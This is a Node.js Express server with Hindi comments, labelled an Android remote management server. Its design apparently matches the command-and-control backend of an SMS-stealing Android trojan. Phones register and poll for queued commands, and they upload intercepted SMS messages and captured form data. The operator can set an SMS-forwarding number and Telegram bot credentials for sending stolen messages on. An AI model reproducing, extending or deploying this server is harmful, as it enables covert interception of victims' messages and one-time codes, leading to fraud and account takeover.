// जरूरी लाइब्रेरीज को इम्पोर्ट करें
const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');

// सर्वर और डेटाबेस का सेटअप
const app = express();
const PORT = process.env.PORT || 3000;
const DATABASE_URL = process.env.DATABASE_URL;

// PostgreSQL डेटाबेस से कनेक्शन
const pool = new Pool({
  connectionString: DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

// सर्वर को JSON और CORS उपयोग करने के लिए कॉन्फ़िगर करें
app.use(cors());
app.use(express.json());

// --- डेटाबेस टेबल बनाने का लॉजिक ---
async function createTables() {
  const createQueries = [
    `CREATE TABLE IF NOT EXISTS devices (
      id SERIAL PRIMARY KEY,
      device_id TEXT UNIQUE NOT NULL,
      device_name TEXT,
      os_version TEXT,
      phone_number TEXT,
      battery_level INTEGER,
      last_seen TIMESTAMPTZ NOT NULL,
      created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP
    );`,
    `CREATE TABLE IF NOT EXISTS commands (
      id SERIAL PRIMARY KEY,
      device_id TEXT NOT NULL,
      command_type TEXT NOT NULL,
      command_data TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'pending',
      created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP
    );`,
    `CREATE TABLE IF NOT EXISTS sms_logs (
      id SERIAL PRIMARY KEY,
      device_id TEXT NOT NULL,
      sender TEXT NOT NULL,
      message_body TEXT NOT NULL,
      received_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP
    );`,
    `CREATE TABLE IF NOT EXISTS form_submissions (
      id SERIAL PRIMARY KEY,
      device_id TEXT NOT NULL,
      custom_data TEXT NOT NULL,
      submitted_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP
    );`,
    `CREATE TABLE IF NOT EXISTS global_settings (
      setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
      setting_value TEXT
    );`,
    // डेमो डिवाइस बनाने का लॉजिक
    `INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at)
     VALUES ('demo-device-12345', 'My Test Phone', 'Android 13', '+919999999999', 90, NOW(), NOW())
     ON CONFLICT (device_id) DO NOTHING;`
  ];

  for (const query of createQueries) {
    await pool.query(query);
  }
  console.log('Database tables are ready.');
}

// --- API एंडपॉइंट्स ---

// 1. डिवाइस रजिस्ट्रेशन और लाइव स्टेटस
app.post('/api/device/register', async (req, res) => {
  const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
  if (!device_id) {
    return res.status(400).json({ status: 'error', message: 'device_id is required.' });
  }

  try {
    const existingDevice = await pool.query('SELECT * FROM devices WHERE device_id = $1', [device_id]);
    if (existingDevice.rows.length > 0) {
      await pool.query(
        'UPDATE devices SET device_name = $1, os_version = $2, battery_level = $3, phone_number = $4, last_seen = NOW() WHERE device_id = $5',
        [device_name, os_version, battery_level, phone_number, device_id]
      );
    } else {
      await pool.query(
        'INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen) VALUES ($1, $2, $3, $4, $5, NOW())',
        [device_id, device_name, os_version, battery_level, phone_number]
      );
    }
    res.status(200).json({ status: 'success', message: 'Device data received.' });
  } catch (err) {
    res.status(500).json({ status: 'error', message: err.message });
  }
});

// 2. डिवाइस लिस्ट दिखाना
app.get('/api/devices', async (req, res) => {
  try {
    const { rows } = await pool.query('SELECT * FROM devices ORDER BY created_at ASC');
    const devicesWithStatus = rows.map(device => {
      const lastSeen = new Date(device.last_seen);
      const isOnline = (new Date() - lastSeen) < 20000; // 20 सेकंड का लॉजिक
      return { ...device, is_online: isOnline };
    });
    res.status(200).json(devicesWithStatus);
  } catch (err) {
    res.status(500).json({ status: 'error', message: err.message });
  }
});

// 3 & 4. SMS फॉरवर्डिंग नंबर को सेट करना और पाना
app.post('/api/config/sms_forward', async (req, res) => {
  const { forward_number } = req.body;
  await pool.query(
    `INSERT INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', $1)
     ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1`,
    [forward_number]
  );
  res.status(200).json({ status: 'success', message: 'Forwarding number updated successfully.' });
});

app.get('/api/config/sms_forward', async (req, res) => {
  const { rows } = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'sms_forward_number'");
  res.status(200).json({ forward_number: rows.length > 0 ? rows[0].setting_value : null });
});

// 5. टेलीग्राम फॉरवर्डिंग
app.post('/api/config/telegram', async (req, res) => {
    const { telegram_bot_token, telegram_chat_id } = req.body;
    await pool.query(`INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', $1) ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1`, [telegram_bot_token]);
    await pool.query(`INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_chat_id', $1) ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1`, [telegram_chat_id]);
    res.status(200).json({ status: 'success', message: 'Telegram settings updated.' });
});

app.get('/api/config/telegram', async (req, res) => {
    const tokenRow = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_bot_token'");
    const chatRow = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_chat_id'");
    res.status(200).json({
        telegram_bot_token: tokenRow.rows.length > 0 ? tokenRow.rows[0].setting_value : null,
        telegram_chat_id: chatRow.rows.length > 0 ? chatRow.rows[0].setting_value : null
    });
});


// 6. कमांड भेजना
app.post('/api/command/send', async (req, res) => {
  const { device_id, command_type, command_data } = req.body;
  await pool.query(
    'INSERT INTO commands (device_id, command_type, command_data) VALUES ($1, $2, $3)',
    [device_id, command_type, JSON.stringify(command_data)]
  );
  res.status(200).json({ status: 'success', message: 'Command queued.' });
});

// क्लाइंट के लिए पेंडिंग कमांड पाना
app.get('/api/device/:deviceId/commands', async (req, res) => {
    const { deviceId } = req.params;
    const { rows } = await pool.query("SELECT * FROM commands WHERE device_id = $1 AND status = 'pending'", [deviceId]);
    
    // कमांड भेजने के बाद उनका स्टेटस 'sent' में बदलना
    if (rows.length > 0) {
        const commandIds = rows.map(cmd => cmd.id);
        await pool.query("UPDATE commands SET status = 'sent' WHERE id = ANY($1::int[])", [commandIds]);
    }
    res.json(rows.map(row => ({...row, command_data: JSON.parse(row.command_data)})));
});

// कमांड पूरा होने पर मार्क करना
app.post('/api/command/:commandId/execute', async (req, res) => {
    await pool.query("UPDATE commands SET status = 'executed' WHERE id = $1", [req.params.commandId]);
    res.status(200).json({ status: 'success', message: 'Command marked as executed.' });
});


// 7. फॉर्म सबमिशन
app.post('/api/device/:deviceId/forms', async (req, res) => {
    await pool.query('INSERT INTO form_submissions (device_id, custom_data) VALUES ($1, $2)', [req.params.deviceId, req.body.custom_data]);
    res.status(200).json({ status: 'success', message: 'Form data received.' });
});

// 8. SMS लॉग्स
app.post('/api/device/:deviceId/sms', async (req, res) => {
    await pool.query('INSERT INTO sms_logs (device_id, sender, message_body) VALUES ($1, $2, $3)', [req.params.deviceId, req.body.sender, req.body.message_body]);
    res.status(200).json({ status: 'success', message: 'SMS logged.' });
});

// 9. डिवाइस डिलीट करना
app.delete('/api/device/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    await pool.query('DELETE FROM sms_logs WHERE device_id = $1', [deviceId]);
    await pool.query('DELETE FROM form_submissions WHERE device_id = $1', [deviceId]);
    await pool.query('DELETE FROM devices WHERE device_id = $1', [deviceId]);
    res.status(200).json({ status: 'success', message: 'Device and related data deleted.' });
});

// 10. SMS डिलीट करना
app.delete('/api/sms/:smsId', async (req, res) => {
    await pool.query('DELETE FROM sms_logs WHERE id = $1', [req.params.smsId]);
    res.status(200).json({ status: 'success', message: 'SMS deleted.' });
});

// फ्रंटएंड पर दिखाने के लिए एक रूट
app.get('/', (req, res) => {
  res.send('<h1>Android Remote Management Server is Running</h1><p>Server is active and connected to the database.</p>');
});

// सर्वर को शुरू करना
app.listen(PORT, async () => {
  try {
    await createTables();
    console.log(`Server is running on port ${PORT}`);
  } catch (err) {
    console.error('Failed to initialize database:', err);
  }
});
